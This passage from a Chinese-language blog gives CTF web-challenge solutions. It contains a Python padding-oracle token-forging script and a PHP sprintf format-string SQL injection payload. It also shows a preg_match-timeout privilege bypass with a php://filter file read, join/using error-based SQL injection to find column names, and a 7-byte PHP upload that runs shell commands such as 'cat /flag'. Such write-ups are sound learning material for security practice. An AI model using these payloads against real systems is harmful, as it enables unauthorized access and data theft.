class="string">'Set-Cookie'</span>].replace(<span class="string">"%3D"</span>,<span class="string">'='</span>).replace(<span class="string">"%2F"</span>,<span class="string">'/'</span>).replace(<span class="string">"%2B"</span>,<span class="string">'+'</span>).decode(<span class="string">'base64'</span>)</span><br><span class="line">    session = <span class="string">"j297k7o6d8stcbvi2c23naj5j6"</span></span><br><span class="line">    <span class="keyword">return</span> session, token</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    phpsession,token = login(url)</span><br><span class="line"></span><br><span class="line">    middle1=padding_oracle(N)</span><br><span class="line">    <span class="keyword">print</span> middle1</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line">    <span class="keyword">if</span>(len(middle1)+<span class="number">1</span>==<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">            middle=chr(i)+middle1</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"token:"</span>+token</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"middle:"</span>+middle</span><br><span class="line">            plaintext=xor(middle,token);</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"plaintext:"</span>+plaintext</span><br><span class="line">            des=pad(<span class="string">'admin'</span>,N)</span><br><span class="line">            tmp=<span class="string">""</span></span><br><span class="line">            <span class="keyword">print</span> des.encode(<span class="string">"base64"</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">                tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i]))</span><br><span class="line">            <span class="keyword">print</span> tmp.encode(<span class="string">'base64'</span>)</span><br><span class="line">            result=inject_token(base64.b64encode(tmp))</span><br><span class="line">            <span class="comment"># print result.content</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Login Form"</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content <span class="keyword">and</span> <span class="string">"Error"</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content:</span><br><span class="line">                <span class="keyword">print</span> result.content</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"success"</span></span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>

<h4 id="格式化字符串sql注入"><a href="#格式化字符串sql注入" class="headerlink" title="格式化字符串sql注入"></a>格式化字符串sql注入</h4><p><code>sprintf(&quot;SELECT * FROM article WHERE id=&#39;%s&#39; $title&quot;, $id);</code></p>
<p>这里的<code>$title = sprintf(&quot;AND title=&#39;%s&#39;&quot;, $title);</code></p>
<p>其中<code>$title</code>和<code>$id</code>都经过<code>mysql_real_escape_string</code>处理，会使<code>&#39;</code>前加斜杠变为<code>\&#39;</code></p>
<p>如果传入<code>title</code>为<code>aaa%&#39;or 1=1 #</code>则变为<code>AND title=&#39;aaa%\&#39;or 1=1 #&#39;</code>，<code>%\</code>会被认为是个格式化字符串，则单引号会逃逸出来</p>
<p>但传入<code>%&#39;</code>的话会使sprintf语句中有两个格式化字符串，但只有一个参数，会报错</p>
<p>PHP的sprintf中，有<code>%1$\</code>这样的语法，百分号<code>%</code>后面的数表示使用第几个参数，$后面的表示类型，常见的类型比如s表示字符串等等。比如 <code>%1$s</code>，表示使用第一个参数，类型为字符串（<code>%s</code>）</p>
<p>title传入<code>flag%1$&#39; or 1=1#</code>，变为<code>AND title=&#39;flag%1$\&#39; or 1=1#&#39;</code>，<code>$\</code>变成类型<code>%\</code>,这个不存在的类型会直接跳过不处理，吸收了<code>\</code>使单引号逃逸</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;title=%1$&apos; union select 1,(select f14g from web1.key limit 0,1),3%23</span><br></pre></td></tr></table></figure>

<h3 id="萌萌哒报名系统"><a href="#萌萌哒报名系统" class="headerlink" title="萌萌哒报名系统"></a>萌萌哒报名系统</h3><p>提示是IDE开发的系统，发现<code>.idea/workspace.xml</code>，打开后发现发现源码包<code>xdcms2333.zip</code></p>
<p>regisrer.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $admin = <span class="string">"xdsec"</span>.<span class="string">"###"</span>.str_shuffle(<span class="string">'you_are_the_member_of_xdsec_here_is_your_flag'</span>);</span><br><span class="line">    $username = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'username'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'username'</span>] : <span class="keyword">die</span>(<span class="string">'Missing username'</span>);</span><br><span class="line">    $password = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'password'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'password'</span>] : <span class="keyword">die</span>(<span class="string">'Missing password'</span>);</span><br><span class="line">    $code = (<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>]) === <span class="keyword">true</span>) ? (string)$_POST[<span class="string">'code'</span>] : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strlen($username) &gt; <span class="number">16</span> || strlen($username) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Invalid input'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT username FROM users WHERE username = :username'</span>);</span><br><span class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</span><br><span class="line">    <span class="keyword">if</span> ($sth-&gt;fetch() !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'username has been registered'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO users (username, password) VALUES (:username, :password)'</span>);</span><br><span class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username, <span class="string">':password'</span> =&gt; $password]);</span><br><span class="line"></span><br><span class="line">    preg_match(<span class="string">'/^(xdsec)((?:###|\w)+)$/i'</span>, $code, $matches);</span><br><span class="line">    <span class="keyword">if</span> (count($matches) === <span class="number">3</span> &amp;&amp; $admin === $matches[<span class="number">0</span>]) &#123;</span><br><span class="line">        $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO identities (username, identity) VALUES (:username, :identity)'</span>);</span><br><span class="line">        $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username, <span class="string">':identity'</span> =&gt; $matches[<span class="number">1</span>]]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO identities (username, identity) VALUES (:username, "GUEST")'</span>);</span><br><span class="line">        $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("register success");location.href="./index.html"&lt;/script&gt;'</span>;</span><br></pre></td></tr></table></figure>

<p>login.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $username = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'username'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'username'</span>] : <span class="keyword">die</span>(<span class="string">'Missing username'</span>);</span><br><span class="line">    $password = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'password'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'password'</span>] : <span class="keyword">die</span>(<span class="string">'Missing password'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strlen($username) &gt; <span class="number">32</span> || strlen($password) &gt; <span class="number">32</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Invalid input'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT password FROM users WHERE username = :username'</span>);</span><br><span class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</span><br><span class="line">    <span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] !== $password) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'wrong password'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION[<span class="string">'is_logined'</span>]);</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION[<span class="string">'is_guest'</span>]);</span><br><span class="line">    <span class="comment">#echo $username;</span></span><br><span class="line">    header(<span class="string">"Location: member.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>member.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'please login first'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT identity FROM identities WHERE username = :username'</span>);</span><br><span class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $_SESSION[<span class="string">'username'</span>]]);</span><br><span class="line">    <span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] === <span class="string">'GUEST'</span>) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'is_guest'</span>] = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_SESSION[<span class="string">'is_logined'</span>] = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'is_logined'</span>]) === <span class="keyword">false</span> || <span class="keyword">isset</span>($_SESSION[<span class="string">'is_guest'</span>]) === <span class="keyword">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])===<span class="keyword">false</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"None"</span>;</span><br><span class="line">        <span class="keyword">elseif</span>(is_file($_GET[<span class="string">'file'</span>]))</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you cannot give me a file"</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            readfile($_GET[<span class="string">'file'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=hello</span><br><span class="line">password=hello</span><br><span class="line">code=&quot;xdsec&quot;+5000*&quot;###A&quot;</span><br></pre></td></tr></table></figure>

<p>传入<code>code</code>为超长的字符串，并且符合<code>preg_match</code>匹配的模式。则执行<code>preg_match</code>时会超时使php脚本停止</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$sth = $pdo-&gt;prepare(&apos;INSERT INTO users (username, password) VALUES (:username, :password)&apos;);</span><br><span class="line">$sth-&gt;execute([&apos;:username&apos; =&gt; $username, &apos;:password&apos; =&gt; $password]);</span><br><span class="line"></span><br><span class="line">preg_match(&apos;/^(xdsec)((?:###|\w)+)$/i&apos;, $code, $matches);</span><br><span class="line">if (count($matches) === 3 &amp;&amp; $admin === $matches[0]) &#123;</span><br><span class="line">    $sth = $pdo-&gt;prepare(&apos;INSERT INTO identities (username, identity) VALUES (:username, :identity)&apos;);</span><br><span class="line">    $sth-&gt;execute([&apos;:username&apos; =&gt; $username, &apos;:identity&apos; =&gt; $matches[1]]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $sth = $pdo-&gt;prepare(&apos;INSERT INTO identities (username, identity) VALUES (:username, &quot;GUEST&quot;)&apos;);</span><br><span class="line">    $sth-&gt;execute([&apos;:username&apos; =&gt; $username]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在代码中，先插入了<code>users</code>表，然后执行<code>preg_match</code>，然后插入的<code>identity</code>表。插入<code>users</code>表的sql语句在<code>preg_match</code>之前已经执行了，所以脚本超时停止也已经执行了之前的sql语句</p>
<p>这样字符串<code>guest</code>没有被插入成功，在<code>member.php</code>中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($sth-&gt;fetch()[0] === &apos;GUEST&apos;) &#123;</span><br><span class="line">    $_SESSION[&apos;is_guest&apos;] = true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会被跳过，然后进入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&apos;file&apos;])===false)</span><br><span class="line">    echo &quot;None&quot;;</span><br><span class="line">elseif(is_file($_GET[&apos;file&apos;]))</span><br><span class="line">    echo &quot;you cannot give me a file&quot;;</span><br><span class="line">else</span><br><span class="line">    readfile($_GET[&apos;file&apos;]);</span><br></pre></td></tr></table></figure>

<p>is_file()判断是否是文件，如果是一个文件就不让读取，不过<code>readfile()</code>函数支持php伪协议，所以可以用php伪协议绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></figure>

<h3 id="他们有什么秘密呢"><a href="#他们有什么秘密呢" class="headerlink" title="他们有什么秘密呢"></a>他们有什么秘密呢</h3><p>查看源代码后，有提示：<br><code>&lt;!-- Tip:将表的某一个字段名，和表中某一个表值进行字符串连接，就可以得到下一个入口喽~ --&gt;</code></p>
<p>经过测试，过滤了information等关键字。而union，select等则没有过滤</p>
<h4 id="报错注入获取表名"><a href="#报错注入获取表名" class="headerlink" title="报错注入获取表名"></a>报错注入获取表名</h4><p>Mysql中有<code>Polygon()</code>函数，如果传入的值是存在的字段的话，就会爆出已知库、表、列</p>
<p>在这个题目中，<code>Polygon()</code>函数同样也被过滤了，但还有其他同样作用的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">linestring()</span><br><span class="line">multiPolygon()</span><br><span class="line">multilinestring()</span><br><span class="line">GeometryCollection()</span><br><span class="line">MultiPoint()</span><br></pre></td></tr></table></figure>

<p>这里利用<code>linestring()</code>函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://182.254.246.93/entrance.php</span><br><span class="line"></span><br><span class="line">POST: pro_id=1 and linestring(pro_id)</span><br></pre></td></tr></table></figure>

<p><img src="https://xianzhi.aliyun.com/forum//media/upload/picture/20171204152050-a7979190-d8c3-1.png" alt="image"></p>
<p>得到数据库名：<code>youcanneverfindme17</code>，表名：<code>product_2017ctf</code>，字段名：<code>pro_id</code></p>
<h4 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select * from users as a join users) as b;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &apos;id&apos;</span><br><span class="line"></span><br><span class="line">利用using爆其他字段</span><br><span class="line">mysql&gt; select * from (select * from users as a join users as b using (id)) as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &apos;username&apos;</span><br><span class="line">mysql&gt; select * from (select * from users as a join users as b using (id,username)) as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &apos;password&apos;</span><br></pre></td></tr></table></figure>

<p>在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候查询到重复字段，就成功报错</p>
<p>第一步：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id)) as c);</span><br><span class="line">Duplicate column name &apos;pro_name&apos;</span><br></pre></td></tr></table></figure>

<p>第二步：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name)) as c);</span><br><span class="line">Duplicate column name &apos;owner&apos;</span><br></pre></td></tr></table></figure>

<p>第三步：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name,owner)) as c);</span><br><span class="line">Duplicate column name &apos;d067a0fa9dc61a6e&apos;</span><br></pre></td></tr></table></figure>

<p>得到列名<code>pro_id</code>，<code>pro_name</code>，<code>owner</code>，<code>d067a0fa9dc61a6e</code></p>
<h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><p>直接查询发现<code>d067a0fa9dc61a6e</code>被ban掉了，利用union搭配别名子查询，在不知道字段名的时候进行注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST:pro_id=-2513 UNION ALL SELECT NULL,CONCAT((select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from product_2017ctf)e limit 1 offset 3 )),NULL,NULL--</span><br><span class="line"></span><br><span class="line">product name:7195ca99696b5a896.php</span><br></pre></td></tr></table></figure>

<p>根据提示得到<code>d067a0fa9dc61a6e7195ca99696b5a896.php</code></p>
<h4 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h4><p>看到是一个文件上传的页面，但只能上传7字节的内容</p>
<p>上传一个php，名为<code>z.php</code>,内容为<code>&lt;?=`*`;</code>，其中<code>&lt;?=</code>表示<code>&lt;? php echo</code>，而php能执行反引号中的命令，<code>*</code>是shell中的通配符，会将符合模式的文件列出来，也就是当前目录下全部文件</p>
<p>然后上传一个名为<code>bash</code>的文件，再传一个名字的字母序在<code>bash</code>后的文件(<code>bash2</code>或者<code>c</code>)，内容为要执行的命令(<code>ls /</code>,<code>cat /flag</code>)</p>
<p>然后访问<code>z.php</code>，相当于执行<code>bash bash2</code></p>
<p>参考：</p>
<ul>
<li><a href="https://xz.aliyun.com/t/1635#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/1635#toc-8</a></li>
<li><a href="http://www.wupco.cn/?p=4117" target="_blank" rel="noopener">http://www.wupco.cn/?p=4117</a></li>
<li><a href="http://0cx.cc/some_tips_with_mysql.jspx" target="_blank" rel="noopener">http://0cx.cc/some_tips_with_mysql.jspx</a></li>
<li><a href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/" target="_blank" rel="noopener">http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/</a></li>
</ul>

  </article>
</div>


    




</div>

<div class="footer-wrapper container">
  <footer class="footer clearfix">
    <div class="clearfix">
    <a href="https://daolgts.github.io" class="footer-logo">
      <i class="fa fa-github"></i>
    </a>
    <ul class="footer-social-link">
      <li>© 2019 daolgts</li>
      <li><a href="https://daolgts.github.io">Home</a></li>
      
      <li><a href="https://github.com/daolgts">Github</a></li>
      
    </ul>
    <div class="footer-theme-info">
      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
    </div>
    </div>
    
  </footer>
</div>


<script>
  (function() {
    var cx = '005157513716557594323:jvii0oiejlb';
    var gcse = document.createElement('script');
    gcse.type = 'text/javascript';
    gcse.async = true;
    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
      '//cse.google.com/cse.js?cx=' + cx;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(gcse, s);
  })();
</script>



<script src="/js/main.js"></script>

</body>
</html>
